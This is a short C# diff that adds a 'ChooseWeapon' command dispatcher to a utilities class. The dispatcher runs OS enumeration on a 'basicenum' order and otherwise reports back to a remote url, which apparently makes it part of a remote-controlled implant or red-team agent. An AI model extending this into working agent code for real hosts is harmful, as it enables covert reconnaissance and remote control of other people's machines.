@@ -64,6 +64,21 @@ class Utilities
         return check;
     }
 
+    // Choose Weapon
+    public static void ChooseWeapon(string url, string weapon)
+    {
+        weapon = weapon.Substring(7);
+        
+        switch (weapon.ToLower()) {
+            case "basicenum":
+                Weapons.ListBasicOSInfo();   
+                break;
+            default:
+                Post(url, "#!#Weapon does not exist");
+                break;
+        }
+    }
+
     // Check Root Dir
     public static string IsRoot(string location)
     {
